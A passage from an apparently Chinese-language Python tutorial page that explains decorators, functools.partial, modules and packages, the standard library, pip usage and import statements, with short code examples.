</textarea><textarea>
import functools

def log_with_param(text):
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            print('call %s():' % func.__name__)
            print('args = {}'.format(*args))
            print('log_param = {}'.format(text))
            return func(*args, **kwargs)

        return wrapper

    return decorator

@log_with_param("param")
def test_with_param(p):
    print(test_with_param.__name__)

# 等价于
# 传入装饰器的参数,并接收返回的decorator函数
decorator = log_with_param("param")
# 传入test_with_param函数
wrapper = decorator(test_with_param)
# 调用装饰器函数
wrapper("I'm a param")

</textarea>使用基于装饰器的授权(Authorization):装饰器能有助于检查某人是否被授权去使用一个web应用的端点(endpoint),它们被大量使用于Flask和Django web框架中<textarea>
from functools import wraps

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            authenticate()
        return f(*args, **kwargs)
    return decorated

</textarea>日志(Logging)是装饰器运用的另一个亮点<textarea>
from functools import wraps

def logit(func):
    @wraps(func)
    def with_logging(*args, **kwargs):
        print(func.__name__ + " was called")
        return func(*args, **kwargs)
    return with_logging

@logit
def addition_func(x):
   """Do some math."""
   return x + x

result = addition_func(4)  # addition_func was called

</textarea>将日志打到指定的logfile<textarea>
from functools import wraps

def logit(logfile='out.log'):
    def logging_decorator(func):
        @wraps(func)
        def wrapped_function(*args, **kwargs):
            log_string = func.__name__ + " was called"
            print(log_string)
            # 打开logfile,并写入内容
            with open(logfile, 'a') as opened_file:
                opened_file.write(log_string + '\n')
            return func(*args, **kwargs)
        return wrapped_function
    return logging_decorator

@logit()
def myfunc1():
    pass

myfunc1()   # Output: myfunc1 was called,现在一个叫做out.log的文件出现了,里面的内容就是上面的字符串

@logit(logfile='func2.log')
def myfunc2():
    pass

myfunc2()  # Output: myfunc2 was called,现在一个叫做func2.log的文件出现了,里面的内容就是上面的字符串

</textarea><pre>
Python内置装饰器
在Python中有三个内置的装饰器,都是跟class相关的
1、staticmethod是类静态方法,其跟成员方法的区别是没有self参数,并且可以在类不进行实例化的情况下调用
2、classmethod与成员方法的区别在于所接收的第一个参数不是self(类实例的指针),而是cls(当前类的具体类型)
3、property是属性的意思,表示可以通过类实例直接访问的信息

类装饰器
装饰器函数其实是一个接口约束,它必须接受一个callable对象作为参数,然后返回一个callable对象。
在python中一般callable对象都是函数,但是也有例外,比如只要某个对象重写了call方法,那么这个对象就是callable的。
当创建一个对象后直接去执行这个对象,那么是会抛出异常的,因为他不是callable,无法直接执行,但进行修改后就可以直接执行调用了

装饰器不仅可以是函数,还可以是类,相比函数装饰器,类装饰器具有灵活度大、高内聚、封装性等优点。使用类装饰器主要依靠类的__call__方法,当使用 @ 形式将装饰器附加到函数上时,就会调用此方法

</pre><textarea>
class Test(object):
  def __call__(self, *args, **kwargs):
    print('call called')


t = Test()
print(t()) # call called

</textarea>用类装饰函数<textarea>
class Test(object):
  def __init__(self, func):
    print('test init')
    print('func name is %s ' % func.__name__)
    self.__func = func

  def __call__(self, *args, **kwargs):
    print('装饰器中的功能')
    self.__func()

@Test
def test():
  print('this is test func')

test()

输出结果为：
test init
func name is test
装饰器中的功能
this is test func

</textarea><pre>
当python解释器执行到@Test时会把当前test函数作为参数传入Test对象,调用init方法,同时将test函数指向创建的Test对象,那么在接下来执行test()的时候,其实就是直接对创建的对象进行调用,执行其call方法。

现在有了能用于正式环境的logit装饰器,但当应用的某些部分还比较脆弱时,异常也许是需要更紧急关注的事情。比方说有时只想打日志到一个文件。而有时想把引起注意的问题发送到一个email,同时也保留日志,留个记录。这是一个使用继承的场景,但目前为止只看到过用来构建装饰器的函数。

类也可以用来构建装饰器,现在以一个类而不是一个函数的方式来重新构建logit

</pre><textarea>
from functools import wraps

class logit(object):
    def __init__(self, logfile='out.log'):
        self.logfile = logfile

    def __call__(self, func):
        @wraps(func)
        def wrapped_function(*args, **kwargs):
            log_string = func.__name__ + " was called"
            print(log_string)
            with open(self.logfile, 'a') as opened_file:
                opened_file.write(log_string + '\n')
            # 现在发送一个通知
            self.notify()
            return func(*args, **kwargs)
        return wrapped_function

    def notify(self):
        # logit只打日志,不做别的
        pass

# 这个实现有一个附加优势,在于比嵌套函数的方式更加整洁,而且包裹一个函数还是使用跟以前一样的语法
@logit()
def myfunc1():
    pass

# 现在给logit创建子类来添加email的功能
class email_logit(logit):
    ''' 一个logit的实现版本,可以在函数调用时发送email给管理员 '''
    def __init__(self, email='admin@myproject.com', *args, **kwargs):
        self.email = email
        super(email_logit, self).__init__(*args, **kwargs)

    def notify(self):
        # 发送一封email到self.email
        pass

从现在起,@email_logit将会和@logit产生同样的效果,但是在打日志的基础上,还会多发送一封邮件给管理员

</textarea>
</div>

<div id="partial">
<h4>偏函数</h4><pre>
Python的functools模块提供了很多有用的功能,其中一个就是偏函数(Partial function),这里的偏函数和数学意义上的偏函数不一样
通过设定参数的默认值,可以降低函数调用的难度,而偏函数也可以做到这一点

当函数的参数个数太多需要简化时,使用functools.partial可以创建一个新的函数,这个新函数可以固定住原函数的部分参数,从而在调用时更简单

int()函数可以把字符串转换为整数,当传入字符串时int()函数默认按十进制转换:
>>> int('12345')  # 12345
但int()函数还提供额外的base参数,默认值为10。如果传入base参数,就可以做N进制的转换:
>>> int('12345', base=8) # 5349
>>> int('12345', 16)     # 74565
假设要转换大量的二进制字符串,每次都传入int(x, base=2)非常麻烦,可以定义一个int2()的函数默认把base=2传进去,这样转换二进制就非常方便了

</pre><textarea>
def int2(x, base=2):
    return int(x, base)

print(int2('1000000'))  # 64
print(int2('1010101'))  # 85

# functools.partial就是帮助创建一个偏函数的,不需要自定义int2(),可以直接使用下面的代码创建一个新的函数int2:
import functools
int2 = functools.partial(int, base=2)
print(int2('1000000'))  # 64
print(int2('1010101'))  # 85

</textarea><pre>
简单总结functools.partial的作用就是把一个函数的某些参数给固定住也就是设置默认值,返回一个新的函数,调用这个新函数会更简单。

新的int2函数仅仅是把base参数重新设定默认值为2,但也可以在函数调用时传入其他值:
>>> int2('1000000', base=10)  1000000

创建偏函数时,实际上可以接收函数对象、*args和**kw这3个参数,当传入:
int2 = functools.partial(int, base=2)
实际上固定了int()函数的关键字参数base,也就是:
int2('10010')
相当于:
kw = { 'base': 2 }
int('10010', **kw)

当传入:
max2 = functools.partial(max, 10)
实际上会把10作为*args的一部分自动加到左边,也就是:
max2(5, 6, 7)
相当于:
args = (10, 5, 6, 7)
max(*args)
结果为10。

</pre>
</div>

<div id="module">
<h3>Python模块</h3><pre>
在Python中一个.py文件就称之为一个模块Module,模块是一组Python代码的集合,可以使用其他模块,也可以被其他模块使用
使用文本编辑器为解释器准备输入并将该文件作为输入运行,这被称作编写脚本

模块能够有逻辑地组织Python代码段
把相关的代码分配到一个模块里能让代码更好用,更易懂
模块能定义函数、类和变量,模块里也能包含可执行的代码

最大好处是大大提高了代码的可维护性,其次编写代码不必从零开始,当一个模块编写完毕就可以被其他地方引用。编程时经常引用其他模块,包括Python内置的模块和来自第三方的模块
使用模块还可以避免函数名和变量名冲突,相同名字的函数和变量完全可以分别存在不同的模块中,因此编写模块时不必考虑名字会与其他模块冲突,但尽量不要与内置函数名字冲突

模块名要遵循Python变量命名规范,不要使用中文、特殊字符;
模块名不要和系统模块名冲突,最好先查看系统是否已存在该模块,检查方法是在Python交互环境执行import abc,若成功则说明系统存在此模块

Python语言能被广泛应用于各行各业在很大程度上得益于它的模块化系统,在Python的标准安装中包含了一组自带的模块,这些模块被称为"标准库"。
开发者可以根据需要不断地为Python增加扩展库,各行各业的Python用户贡献了大量的扩展库,这些扩展库极大地丰富了Python的功能,这些扩展库从某种程度上也形成了Python的"生态圈"

Python内置函数：Python自带的内置函数。函数无需导入,直接使用,如要计算-3.2的绝对值直接使用abs函数
Python标准库：Python自带的标准库,无需安装,只需通过import方法导入便可使用其中的方法,如导入string模块,然后使用其中的find方法
第三方库：Python的第三方库,需要先进行安装,部分可能需要配置
外部工具：非Python写成的库或包,用于Python数据工作的相关工具

Python3的标准库请参考https://docs.python.org/3/library/index.html

Introduction
Notes on availability

Built-in Functions

Built-in Constants
Constants added by the site module

Built-in Types
Truth Value Testing
Boolean Operations — and, or, not
Comparisons
Numeric Types — int, float, complex
Iterator Types
Sequence Types — list, tuple, range
Text Sequence Type — str
Binary Sequence Types — bytes, bytearray, memoryview
Set Types — set, frozenset
Mapping Types — dict
Context Manager Types
Other Built-in Types
Special Attributes

Built-in Exceptions
Base classes
Concrete exceptions
Warnings
Exception hierarchy

Text Processing Services(文本处理)
string — Common string operations
re — Regular expression operations
difflib — Helpers for computing deltas
textwrap — Text wrapping and filling
unicodedata — Unicode Database
stringprep — Internet String Preparation
readline — GNU readline interface
rlcompleter — Completion function for GNU readline

Binary Data Services
struct — Interpret bytes as packed binary data
codecs — Codec registry and base classes

Data Types(数据结构)
datetime — Basic date and time types
calendar — General calendar-related functions
collections — Container datatypes
collections.abc — Abstract Base Classes for Containers
heapq(堆排序实现) — Heap queue algorithm
bisect(二分查找实现) — Array bisection algorithm
array(数列实现) — Efficient arrays of numeric values
weakref — Weak references
types — Dynamic type creation and names for built-in types
copy(浅拷贝和深拷贝) — Shallow and deep copy operations
pprint(漂亮地输出文本) — Data pretty printer
reprlib — Alternate repr() implementation
enum(枚举类的实现) — Support for enumerations

Numeric and Mathematical Modules
numbers — Numeric abstract base classes
math(数学函数库) — Mathematical functions
cmath — Mathematical functions for complex numbers
decimal — Decimal fixed point and floating point arithmetic
fractions(分数运算) — Rational numbers
random(随机数) — Generate pseudo-random numbers
statistics(统计学函数) — Mathematical statistics functions

Functional Programming Modules(函数式编程模块)
itertools(迭代器工具) — Functions creating iterators for efficient looping
functools(函数工具) — Higher-order functions and operations on callable objects
operator(基本操作符) — Standard operators as functions

File and Directory Access(文件目录访问)
pathlib(对路径对象进行操作,完美替代os.path) — Object-oriented filesystem paths
os.path — Common pathname manipulations
fileinput(读取一个或多个文件并处理行) — Iterate over linesfrommultiple input streams
stat — Interpreting stat() results
filecmp(比较两个文件是否相同) — File and Directory Comparisons
tempfile(用来创建临时文件,一关闭就自动删除) — Generate temporary files and directories
glob — Unix style pathname pattern expansion
fnmatch — Unix filename pattern matching
linecache(读取文件的行,缓存优化) — Random access to text lines
shutil(文件操作) — High-level file operations,常用函数copy, copytree, rmtree, move, make_archive
macpath — Mac OS 9 path manipulation functions

Data Persistence(数据持久化)
pickle(文件pickle序列化) —Pythonobject serialization
copyreg — Register pickle support functions
shelve —Pythonobject persistence
marshal — InternalPythonobject serialization
dbm — Interfaces to Unix "databases"
sqlite3(sqlite数据库接口) — DB-API 2.0 interface for SQLite databases

Data Compression and Archiving
zlib — Compression compatible with gzip
gzip — Support for gzip files
bz2 — Support for bzip2 compression
lzma — Compression using the LZMA algorithm
zipfile — Work with ZIP archives
tarfile — Read and write tar archive files

File Formats(文件格式)
csv(处理csv文件) — CSV File Reading and Writing
configparser(处理配置文件) — Configuration file parser
netrc — netrc file processing
xdrlib — Encode and decode XDR data
plistlib — Generate and parse Mac OS X .plist files

Cryptographic Services(密码学)
hashlib(哈希加密算法) — Secure hashes and message digests
hmac — Keyed-Hashing for Message Authentication
secrets(密钥生成) — Generate secure random numbers for managing secrets

Generic Operating System Services(操作系统)
os(操作系统) — Miscellaneous operating system interfaces
io(在内存中读写str和bytes) — Core tools for working with streams
time(计时器) — Time access and conversions
argparse(命令行处理) — Parser for command-line options, arguments and sub-commands
getopt(命令行处理) — C-style parser for command line options
logging(打日志) — Logging facility for Python
logging.config — Logging configuration
logging.handlers — Logging handlers
getpass(获取用户输入的密码) — Portable password input
curses — Terminal handling for character-cell displays
curses.textpad — Text input widget for curses programs
curses.ascii — Utilities for ASCII characters
curses.panel — A panel stack extension for curses
platform(提供跨平台支持) — Access to underlying platform's identifying data
errno — Standard errno system symbols
ctypes — A foreign function library for Python

Concurrent Execution(并发执行)
threading(多线程模型) — Thread-based parallelism
multiprocessing(多进程模型) — Process-based parallelism
The concurrent package
concurrent.futures(异步执行模型) — Launching parallel tasks
subprocess(子进程管理) — Subprocess management
sched(调度工具) — Event scheduler
queue(同步队列) — A synchronized queue class
_thread — Low-level threading API
_dummy_thread — Drop-in replacement for the _thread module
dummy_threading — Drop-in replacement for the threading module

contextvars — Context Variables
Context Variables
Manual Context Management
asyncio support

Networking and Interprocess Communication(进程间通信和网络)
asyncio(步IO, eventloop, 协程) — Asynchronous I/O
socket — Low-level networking interface
ssl — TLS/SSL wrapper for socket objects
select — Waiting for I/O completion
selectors — High-level I/O multiplexing
asyncore — Asynchronous socket handler
asynchat — Asynchronous socket command/response handler
signal — Set handlers for asynchronous events
mmap — Memory-mapped file support

Internet Data Handling(网络数据处理)
email(处理email) — An email and MIME handling package
json(处理json) — JSON encoder and decoder
mailcap — Mailcap file handling
mailbox — Manipulate mailboxes in various formats
mimetypes — Map filenames to MIME types
base64(处理base64编码) — Base16, Base32, Base64, Base85 Data Encodings
binhex — Encode and decode binhex4 files
binascii — Convert between binary and ASCII
quopri — Encode and decode MIME quoted-printable data
uu — Encode and decode uuencode files

Structured Markup Processing Tools(结构化标记语言工具)
html(转义html) — HyperText Markup Language support
html.parser(解析html) — Simple HTML and XHTML parser
html.entities — Definitions of HTML general entities
XML Processing Modules
xml.etree.ElementTree — The ElementTree XML API
xml.dom — The Document Object Model API
xml.dom.minidom — Minimal DOM implementation
xml.dom.pulldom — Support for building partial DOM trees
xml.sax — Support for SAX2 parsers
xml.sax.handler — Base classes for SAX handlers
xml.sax.saxutils — SAX Utilities
xml.sax.xmlreader — Interface for XML parsers
xml.parsers.expat — Fast XML parsing using Expat

Internet Protocols and Support(网络协议支持)
webbrowser(打开浏览器) — Convenient Web-browser controller,webbrowser.open('https://www.baidu.com')
cgi — Common Gateway Interface support
cgitb — Traceback manager for CGI scripts
wsgiref(实现WSGI接口) — WSGI Utilities and Reference Implementation
urllib — URL handling modules
urllib.request — Extensible library for opening URLs
urllib.response — Response classes used by urllib
urllib.parse — Parse URLs into components
urllib.error — Exception classes raised by urllib.request
urllib.robotparser — Parser for robots.txt
http — HTTP modules
http.client — HTTP protocol client
ftplib — FTP protocol client
poplib — POP3 protocol client
imaplib — IMAP4 protocol client
nntplib — NNTP protocol client
smtplib — SMTP protocol client
smtpd — SMTP Server
telnetlib — Telnet client
uuid(通用唯一识别码) — UUID objects according to RFC 4122
socketserver — A framework for network servers
http.server — HTTP servers
http.cookies — HTTP state management
http.cookiejar — Cookie handling for HTTP clients
xmlrpc — XMLRPC server and client modules
xmlrpc.client — XML-RPC client access
xmlrpc.server — Basic XML-RPC servers
ipaddress — IPv4/IPv6 manipulation library

Multimedia Services
audioop — Manipulate raw audio data
aifc — Read and write AIFF and AIFC files
sunau — Read and write Sun AU files
wave — Read and write WAV files
chunk — Read IFF chunked data
colorsys — Conversions between color systems
imghdr — Determine the type of an image
sndhdr — Determine type of sound file
ossaudiodev — Access to OSS-compatible audio devices

Internationalization
gettext — Multilingual internationalization services
locale — Internationalization services

Program Frameworks(程序框架)
turtle(画图工具) — Turtle graphics
cmd(实现交互式shell) — Support for line-oriented command interpreters
shlex(利用shell的语法分割字符串) — Simple lexical analysis

Graphical User Interfaces with Tk
tkinter —Pythoninterface to Tcl/Tk
tkinter.ttk — Tk themed widgets
tkinter.tix — Extension widgets for Tk
tkinter.scrolledtext — Scrolled Text Widget
IDLE
Other Graphical User Interface Packages

Development Tools(开发工具)
typing(类型注解,可配合mypy对项目进行静态类型检查) — Support for type hints
pydoc(查阅模块文档) — Documentation generator and online help system
doctest(文档测试) — Test interactivePythonexamples
unittest(单元测试) — Unit testing framework
unittest.mock — mock object library
unittest.mock — getting started
2to3 - AutomatedPython2 to 3 code translation
test — Regression tests package for Python
test.support — Utilities for thePythontest suite
test.support.script_helper — Utilities for thePythonexecution tests

Debugging and Profiling(DEBUG和性能优化)
bdb — Debugger framework
faulthandler — Dump thePythontraceback
pdb(Python Debugger) — ThePythonDebugger
ThePythonProfilers
timeit(检测代码运行时间) — Measure execution time of small code snippets
trace — Trace or trackPythonstatement execution
tracemalloc — Trace memory allocations

Software Packaging and Distribution(软件打包发布)
distutils — Building and installingPythonmodules
ensurepip — Bootstrapping the pip installer
venv(创建虚拟环境) — Creation of virtual environments
zipapp — Manage executablePythonzip archives

Python Runtime Services(Python运行时服务)
sys(系统环境交互) — System-specific parameters and functions
sysconfig — Provide access to Python's configuration information
builtins(所有的内置函数和类,默认引进) — Built-in objects
__main__(顶层运行环境,使得python文件既可以独立运行,也可以当做模块导入到其他文件) — Top-level script environment
warnings(警告功能(代码过时等)) — Warning control
dataclasses — Data Classes
contextlib(上下文管理器实现) — Utilities for with-statement contexts
abc — Abstract Base Classes
atexit — Exit handlers
traceback — Print or retrieve a stack traceback
__future__ — Future statement definitions
gc — Garbage Collector interface
inspect(用于获取对象的各种信息) — Inspect live objects
site — Site-specific configuration hook

CustomPythonInterpreters(自定义Python解释器)
code(实现自定义的Python解释器,如Scrapy的shell) — Interpreter base classes
codeop — CompilePythoncode

Importing Modules
zipimport — Import modulesfromZip archives
pkgutil — Package extension utility
modulefinder — Find modules used by a script
runpy — Locating and executingPythonmodules
importlib — The implementation of import

Python Language Services
parser — AccessPythonparse trees
ast — Abstract Syntax Trees
symtable — Access to the compiler's symbol tables
symbol — Constants used withPythonparse trees
token — Constants used withPythonparse trees
keyword — Testing forPythonkeywords
tokenize — Tokenizer forPythonsource
tabnanny — Detection of ambiguous indentation
pyclbr —Pythonclass browser support
py_compile — CompilePythonsource files
compileall — Byte-compilePythonlibraries
dis — Disassembler forPythonbytecode
pickletools — Tools for pickle developers

Miscellaneous Services
formatter — Generic output formatting

MS Windows Specific Services
msilib — Read and write Microsoft Installer files
msvcrt — Useful routinesfromthe MS VC++ runtime
winreg — Windows registry access
winsound — Sound-playing interface for Windows

Unix Specific Services
posix — The most common POSIX system calls
pwd — The password database
spwd — The shadow password database
grp — The group database
crypt — Function to check Unix passwords
termios — POSIX style tty control
tty — Terminal control functions
pty — Pseudo-terminal utilities
fcntl — The fcntl and ioctl system calls
pipes — Interface to shell pipelines
resource — Resource usage information
nis — Interface to Sun's NIS (Yellow Pages)
syslog — Unix syslog library routines

Superseded Modules
optparse — Parser for command line options
imp — Access the import internals

Undocumented Modules
Platform specific modules

</pre>
</div>

<div id="package">
<h4>Python中的包Package</h4><pre>
一个需要实际应用的模块往往会具有很多程序单元,包括变量、函数和类等,如果将整个模块的所有内容都定义在同一个Python源文件中,这个文件将会变得非常庞大,显然并不利于模块化开发

为了更好地管理多个模块源文件,Python提供了包的概念
导入多个模块时可避免模块名相同导致的冲突,引入了包以后,只要顶层的包名不与别人冲突,那所有模块都不会与别人冲突
从物理上看,包就是一个文件夹,在该文件夹下包含了一个__init__.py文件,该文件夹可用于包含多个模块源文件;从逻辑上看,包的本质依然是模块

包是一种通过用"带点号的模块名"来构造Python模块命名空间的方法,例如模块名A.B表示A包中名为B的子模块。正如模块的使用使得不同模块的作者不必担心彼此的全局变量名称一样,使用加点的模块名可以使得NumPy或Pillow等多模块软件包的作者不必担心彼此的模块名称一样

包是一个分层次的文件目录结构,它定义了一个由模块及子包和子包下的子包等组成的Python的应用环境。
包就是文件夹,但该文件夹下必须存在 __init__.py文件用于标识当前文件夹是一个包,该文件的内容可以为空。

每一个包目录下面都会有一个__init__.py的文件,这个文件是必须存在的,否则Python就把这个目录当成普通目录,而不是一个包。__init__.py可以是空文件,也可以有Python代码,因为__init__.py本身就是一个模块,而它的模块名就是包名

包的作用是包含多个模块,但包的本质依然是模块,因此包也可用于包含包。为Python安装了request模块之后,可通过$ pip3 show requests命令查看模块的加载路径,可以在Python安装目录的/home/berlin75/.local/lib/python3.6/site-packages/目录下找到一个requests文件夹,它就是前面安装的requests模块,其实是一个requests包

$ ls ~/.local/lib/python3.6/site-packages/requests
__init__.py     _internal_utils.py  auth.py    cookies.py     hooks.py     sessions.py      utils.py
__pycache__     adapters.py         certs.py   exceptions.py  models.py    status_codes.py
__version__.py  api.py              compat.py  help.py        packages.py  structures.py

定义包主要有两步:
1、创建一个文件夹,该文件夹的名字就是该包的包名。
2、在该文件夹内添加一个__init__.py文件即可。

</pre>first_package目录下的test1.py、test2.py、__init__.py文件,test.py为测试调用包的代码,只在每个文件里放置了一个函数,但其实可以放置许多函数,也可以在这些文件里定义Python的类,然后为这些类建一个包<textarea>
目录结构如下:
test.py
first_package
|-- __init__.py
|-- test1.py
|-- test2.py

### first_package/test1.py
def test1():
   print("I'm in test1")

### first_package/test2.py
def test2():
   print("I'm in test2")

### first_package/__init__.py
'''
这是学习包的第一个示例
'''

if __name__ == '__main__':
    print('作为主程序运行')
else:
    print('first_package初始化')

### 在first_package同级目录下创建test.py来调用first_package包
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

# 导入first_package包
from first_package.test1 import test1
from first_package.test2 import test2
test1()
test2()

'''
输出:
first_package初始化
I'm in test1
I'm in test2
'''

### 在first_package同级目录下创建test.py来调用first_package包
#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

# 导入first_package包(模块)
import first_package
print('==========')
print(first_package.__doc__)
print(type(first_package))
print(first_package)

'''
输出:
first_package初始化
==========

这是学习包的第一个示例

< class 'module'>
< module 'first_package'from'/mnt/e/wamp64/www/study/python/first_package/__init__.py'>
'''

</textarea><pre>
从上面的输出结果可以看出,在导入first_package包时,程序执行了该包所对应的文件夹下的__init__.py;从倒数第二行输出可以看到,包的本质就是模块;从最后一行输出可以看到,使用import
first_package导入包的本质就是加载并执行该包下的__init__.py文件,然后将整个文件内容赋值给与包同名的变量,该变量的类型是module。

与模块类似的是,包被导入之后会在包目录下生成一个__pycache__文件夹,并在该文件夹内为包生成一个__init__.cpython-36.pyc文件。

由于导入包就相当于导入该包下的__init__.py文件,因此完全可以在__init__.py文件中定义变量、函数、类等程序单元,但实际上往往并不会这么做。包的主要作用是包含多个模块,因此__init__.py文件的主要作用就是导入该包内的其他模块

</pre><textarea>
fk_package
┠──arithmetic_chart.py
┠──billing.py
┠──print_shape.py
┗━━__init__.py

# arithmetic_chart.py
def print_multiple_chart(n):
    '打印乘法口角表的函数'
    for i in range(n):
        for j in range(i + 1):
            print('%d * %d = %2d' % ((j + 1) , (i + 1) , (j + 1)* (i + 1)), end='  ')
        print('')

# billing.py
class Item:
    '定义代表商品的Item类'
    def __init__(self, price):
        self.price = price
    def __repr__(self):
        return 'Item[price=%g]' % self.price

# print_shape.py
def print_blank_triangle(n):
    '使用星号打印一个空心的三角形'
    if n <= 0:
        raise ValueError('n必须大于0')
    for i in range(n):
        print(' ' * (n - i - 1), end='')
        print('*', end='')
        if i != n - 1:
            print(' ' * (2 * i - 1), end='')
        else:
            print('*' * (2 * i - 1), end='')
        if i != 0:
            print('*')
        else:
            print('')

# 上面三个模块文件都位于fk_package包下,总共提供了两个函数和一个类。这意味着fk_package包(也是模块)总共包含arithmetic_chart、 billing和print_shape三个模块。在这种情况下这三个模块就相当于fk_package包的成员

### 导入包内成员
# 导入fk_package包,实际上就是导入并执行包下__init__.py文件,因此执行这条导入语句之后,程序只能使用fk_package目录下的__init__.py文件中定义的程序单元。对于本例而言,由于fk_package\__init__.py文件内容为空,因此这条导入语句没有任何作用
import fk_package

# 导入fk_package包下的print_shape模块,实际上就是导入并执行fk_package目录下的print_shape.py,并将其赋值给 fk_package.print_shape 变量。因此执行这条导入语句之后,程序可访问 fk_package\print_shape.py 文件所定义的程序单元,但需要添加 fk_package.print_shape 前缀
import fk_package.print_shape

# 实际上就是导入fk_package包(模块)下的billing模块,因此执行这条导入语句之后,程序可使用fk_package\billing.py文件定义的程序单元,而且只需要添加billing前缀
from fk_package import billing

# 导入fk_package包下的arithmetic_chart模块,实际上就是导入fk_package目录下的arithmetic_chart.py
import fk_package.arithmetic_chart

fk_package.print_shape.print_blank_triangle(5)
im = billing.Item(4.5)
print(im)
fk_package.arithmetic_chart.print_multiple_chart(5)

'''
上面程序虽然可以正常运行,但此时存在两个问题:
1、为了调用包内模块中的程序单元,需要使用很长的前缀,这实在是太麻烦了。
2、包内__init__.py文件的功能完全被忽略了。

包内的__init__.py文件并不是用来定义程序单元的,而是用于导入该包内模块的成员,这样即可把模块中的成员导入变成包内成员,以后使用起来会更加方便。
'''

### 将fk_package包下的__init__.py文件编辑成如下
# 从当前包导入print_shape模块,此时当其他程序使用print_shape内的成员时,依然需要通过fk_package.print_shape前缀进行调用
from . import print_shape
# 从.print_shape导入所有程序单元到fk_package中,这样以后只要使用fk_package.前缀就可以使用三个模块内的程序单元
from .print_shape import *

# 从当前包导入billing模块
from . import billing
# 从.billing导入所有程序单元到fk_package中
from .billing import *

# 从当前包导入arithmetic_chart模块
from . import arithmetic_chart
# 从.arithmetic_chart导入所有程序单元到fk_package中
from .arithmetic_chart import *

### 导入fk_package包,实际上就是导入包下__init__.py文件
import fk_package
# 直接使用fk_package前缀即可调用它所包含的模块内的程序单元
fk_package.print_blank_triangle(5)
im = fk_package.Item(4.5)
print(im)
fk_package.print_multiple_chart(5)

</textarea><pre>
类似的,可以有多级目录,组成多级层次的包结构
mycompany
 ├─ web
 │  ├─ __init__.py
 │  ├─ utils.py
 │  └─ www.py
 ├─ __init__.py
 ├─ abc.py
 └─ utils.py
文件www.py的模块名就是mycompany.web.www,两个文件utils.py的模块名分别是mycompany.utils和mycompany.web.utils
自己创建模块时要注意命名,不能和Python自带的模块名称冲突。例如系统自带了sys模块,自己的模块就不可命名为sys.py,否则将无法导入系统自带的sys模块

</pre>
</div>

<div id="pip">
<h4>pip & pip3</h4><pre>
pip是一个Python包管理工具,主要是用于安装PyPI上的软件包,pip在下载python包或模块时会先自动下载其所需的依赖包
如果在命令行窗口中提示找不到pip命令,则也可以通过python命令运行pip模块来安装scrapy,例如python3 -m pip install scrapy

帮助文档
pip3 -h
pip3 --help
pip3 help install

pip更新
pip3 install -U pip

安装PyPI软件
pip3 install django
pip3 install 包名 -i https://pypi.douban.com/simple # 用豆瓣源下载

安装具体版本软件
pip3 install django           # 最新版本
pip3 install django==1.11.8   # 指定版本
pip3 install 'django>=1.11.0' # 大于某个版本

查看具体安装文件
pip3 show --files django

查看软件包信息
pip3 show django

列出软件包清单
pip3 list

查看哪些软件需要更新
pip3 list --outdated

升级软件包
pip3 install --upgrade django

卸载软件包
pip3 uninstall django

搜索
pip3 search django

Requirements文件安装依赖软件
Requirements文件 一般记录的是依赖软件列表,通过pip可以一次性安装依赖软件包:
pip3 freeze > requirements.txt
pip3 install -r requirements.txt

配置pip
配置文件: $HOME/.pip/pip.conf,
比如使用阿里云的同步镜像:
[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com

cmd配置pip
pip config set global.trusted-host mirrors.aliyun.com
Writing to C:\Users\Administrator\AppData\Roaming\pip\pip.ini

pip config set global.index-url http://mirrors.aliyun.com/pypi/simple/
Writing to C:\Users\Administrator\AppData\Roaming\pip\pip.ini

pip config list
global.index-url='http://mirrors.aliyun.com/pypi/simple/'
global.trusted-host='mirrors.aliyun.com'

命令行自动补全
对于bash:
pip completion --bash >> ~/.profile
对于zsh:
pip completion --zsh >> ~/.zprofile

</pre>
</div>

<div id="import">
<h4>以脚本的方式执行模块</h4><textarea>
def fib(n):    # write Fibonacci series up to n
    a, b = 0, 1
    while a < n:
        print(a, end=' ')
        a, b = b, a+b
    print()

def fib2(n):   # return Fibonacci series up to n
    result = []
    a, b = 0, 1
    while a < n:
        result.append(a)
        a, b = b, a+b
    return result

</textarea><pre>
当用下面方式运行一个Python模块:
python fibo.py < arguments>
模块里的代码会被执行,就好像导入了模块一样,但是__name__被赋值为"__main__",这意味着通过在模块末尾添加这些代码:

</pre><textarea>
if __name__ == "__main__":
    import sys
    fib(int(sys.argv[1]))

</textarea><pre>
既可以把这个文件当作脚本又可当作一个可调入的模块来使用,因为那段解析命令行的代码只有在当模块是以"main"文件的方式执行的时候才会运行:

$ python fibo.py 50
0 1 1 2 3 5 8 13 21 34

如果模块是被导入的,那些代码是不运行的:
>>> import fibo
>>>

这经常用于为模块提供一个方便的用户接口或用于测试,以脚本的方式运行模块从而执行一些测试套件

</pre>

<h4>import语句导入模块</h4><pre>
对于一个真实的Python程序,不可能自己完成所有的工作,通常都需要借助于第三方类库。此外也不可能在一个源文件中编写整个程序的源代码,这些都需要以模块化的方式来组织项目的源代码

使用import导入模块
1、import 模块名1 [as 别名1], 模块名2 [as 别名2],…
导入整个模块内的所有成员(包括变量、函数、类等),当使用第一种import语句导入模块中的成员时,必须添加模块名或模块别名前缀

每个模块都有它自己的私有符号表,该表用作模块中定义的所有函数的全局符号表。因此模块的作者可以在模块内使用全局变量,而不必担心与用户的全局变量发生意外冲突。另一方面,如果知道自己在做什么,则可以用跟访问模块内的函数的同样标记方法,去访问一个模块的全局变量,modname.itemname

</pre><textarea>
# 导入sys整个模块
import sys
# 使用sys模块名作为前缀来访问模块中的成员
print(sys.argv[0])   # ./hello.py

# 导入sys整个模块,并指定别名为s
import sys as s
# 使用s模块别名作为前缀来访问模块中的成员
print(s.argv[0])     # ./hello.py

# 导入sys、os两个模块
import sys,os
# 使用模块名作为前缀来访问模块中的成员
print(sys.argv[0])   # ./hello.py
# os模块的sep变量代表平台上的路径分隔符
print(os.sep)        # /

# 导入sys、os两个模块,并为sys指定别名s,为os指定别名o
import sys as s,os as o
# 使用模块别名作为前缀来访问模块中的成员
print(s.argv[0])
print(o.sep)

</textarea><pre>
2、from 模块名 import 成员名1 [as 别名1],成员名2 [as 别名2],…
只导入模块中指定成员,除非使用form 模块名 import ＊(调入所有非以下划线开头的名称),但通常不推荐使用这种语法
使用第二种import语句导入模块中的成员时,无须使用任何前缀,直接使用成员名或成员别名即可

</pre><textarea>
